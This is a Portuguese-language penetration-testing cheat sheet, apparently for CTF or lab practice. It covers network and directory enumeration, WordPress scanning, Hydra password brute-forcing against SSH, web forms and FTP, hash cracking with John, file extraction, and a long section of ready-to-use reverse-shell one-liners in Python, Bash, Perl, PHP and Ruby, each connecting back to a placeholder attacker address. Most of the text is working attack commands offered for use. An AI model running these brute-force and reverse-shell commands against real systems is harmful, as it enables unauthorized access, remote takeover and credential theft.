# _**ENUMERAÇÃO → REDES**_
<mark>Com Nmap</mark>
+ **firewall ativo**: ```nmap -p [port_range] -A -Pn -T5 [ip_address]```
+ **firewall desativado**: ```nmap -p [port_range] -A -T5 [ip_address]```
+ **todas as portas**: ```nmap -p- -A -T[1-5] [ip_address]```

# _**ENUMERAÇÃO → DIRETÓRIOS**_
<mark>Com Gobuster</mark>
> ```bash
> gobuster dir --url [ip_address]:[port] -w [dir]
> ```
+ **diretório principal**: ```../seclists/Discovery/Web-Content/common.txt```
+ **segundo scan**: ```..seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt```
+ **diretório CMS**: ```..seclists/Discovery/Web-Content/CMS/..```
+ **diretório Web-Servers**: ```../seclists/Discovery/Web-Content/Web-Servers/..```

# _**ENUMERAÇÃO → WordPress**_
<mark>Com WpScan</mark>
> ```bash
> wpscan --url [ip_address]:[port] -U -e [flag]
> ```
+ **flag para plugins vulneráveis**: ```vp```
+ **flag para todos os plugins**: ```ap```
+ **flag para temas vulneráveis**: ```vt```

# _**BRUTE FORCE → SENHAS**_
<mark>Com Hydra</mark>
> ```bash
> hydra -l [username] -P [wordlist] -t [1-5] [extensão]
> ```
+ **SSH**: ```ssh://[ip_address]```
+ **WEB**: ```[ip_address] http-post-form "[login_page]:user=^USER^&pass=^PASS^:Username or password invalid"```
+  **FTP**: ```ftp://[ip_address]```

# _**BRUTE FORCE → EXTRAÇÃO DE HASHES**_
<mark>Com John</mark>
> ```bash
> john -w=/path/to/wordlist [file_name]
> ```
+ **zip**: ```zip2john [file.zip] > [file_name]```
+ **ssh**: ```ssh2jon [file] > [file_name.hash]```

# _**EXTRAÇÃO DE ARQUIVOS**_
<mark>De uma máquina-alvo para prórpia máquina</mark>
+ **SSH**: ```scp [username]@[ip_address]:/path/to/file /local/path```
+ **FTP**: ```get [file_name]```
  * **FTP WGET**: ```wget ftp://[usuário]:[senha]@[ip_address]/[path/to/file]```

# _**SHELLS & REVERSE SHELLS**_
Para obter um _reverse shell_, é preciso da ferramenta ```netcat```
> ```bash
> netcat (nc) -lvnp [port]
> ```
<mark>Com Python</mark>
+ **Reverse shell**: ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip_address]",[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
+ **Bash shell**: ```python3 -c 'import pty, os; pty.spawn("/bin/bash")'```

<mark>Com Bash</mark>
+ **Reverse shell**: ```bash -i >& /dev/tcp/[ip_address]/[port] 0>&1```
+ **reverse shell**: ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip_address] [port] >/tmp/f```

<mark>Com Perl</mark>
+ **Reverse shell**: ```perl -e 'use Socket;$i="[ip_address]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

<mark>Com PHP</mark>
+ **Reverse shell**: ```php -r '$sock=fsockopen("[ip_address]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'```
+ **Reverse shell**: [código disponível para download → pentest_monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<mark>Com Ruby</mark>
+ **Reverse shell**: ```ruby -rsocket -e'f=TCPSocket.open("[ip_address]",[port]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

<mark>Com Java</mark>
+ **Reverse shell**: [com este código, em upload web, pode-se obter reverse shell](https://github.com/V0idA2tronaut/Programming/tree/main/Scripts/Shell%20scripts/SHELL%20JAVA)

SEM DECISÃO
+ Binwalk | binwalk -e [file_name] |
| Steghide | steghide extract -sf [file_name][.jpg] |
| Hexeditor | hexeditor [file_name] |
| Strings | strings [file_name] 
